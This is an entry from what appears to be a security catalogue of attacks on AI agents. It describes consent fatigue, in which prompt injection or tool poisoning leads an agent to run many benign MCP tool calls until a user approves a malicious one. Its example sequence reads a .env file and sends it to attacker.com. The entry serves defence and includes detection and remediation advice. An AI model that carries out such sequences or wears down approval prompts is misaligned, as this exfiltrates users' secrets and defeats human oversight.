# TA10.012 — Consent Fatigue Exploitation

## Overview

| Field | Value |
|-------|-------|
| **ID** | TA10.012 |
| **Tactic** | [MCP Server & Tool Security](../../tactics/TA10-mcp-tool-security.md) |
| **Severity** | Medium |
| **AISS Score** | 5.8 |
| **System Types** | F, G |

## Description

An attacker exploits the human tendency to approve MCP tool calls without careful review after repeated prompts. MCP implementations that require per-call user approval create a pattern where users initially review each tool call carefully but progressively approve faster — eventually auto-approving without reading. The attacker embeds a malicious tool call within a sequence of legitimate ones, relying on the user's diminished attention to gain approval.

This is a human factors attack, not a technical vulnerability, but it is specific to MCP's consent model and must be assessed as part of any MCP security evaluation.

## Attack Vector

**Prerequisites:**
- MCP client implements per-call user approval
- User has been exposed to repeated approval prompts (normal usage pattern)
- Attacker can influence the sequence of tool calls (via prompt injection or tool poisoning)

**Procedure:**
1. Trigger a sequence of legitimate, expected tool calls that require user approval
2. After 5-10 legitimate approvals, insert a malicious tool call in the sequence
3. The user, habituated to approving, clicks "Approve" without reviewing the malicious call
4. The malicious tool call executes with user-approved permission

**Example sequence:**
- `read_file("src/main.py")` → Approved
- `read_file("src/utils.py")` → Approved
- `read_file("src/config.py")` → Approved
- `read_file(".env")` → Approved (user fatigued)
- `send_to_url("https://attacker.com", env_contents)` → Approved (user fatigued)

## Detection

- Track approval response times — flag approvals that are significantly faster than the user's baseline
- Highlight tool calls that differ from the expected pattern in the approval UI
- Implement risk-based approval — routine calls auto-approve while novel or sensitive calls require explicit review
- Monitor for sequences of approvals followed by sensitive operations

## Remediation

- **Risk-based approval tiers**: Auto-approve low-risk calls (read public files); require explicit review for high-risk calls (write, send, delete)
- **Batch approval with summary**: Group related tool calls and present a summary instead of individual prompts
- **Approval anomaly highlighting**: Visually distinguish tool calls that differ from the established pattern
- **Approval cooldown**: After a burst of approvals, insert a mandatory pause before the next approval
- **Scope-based blanket approval**: Allow users to approve a scope (e.g., "read any file in /src/") rather than individual calls
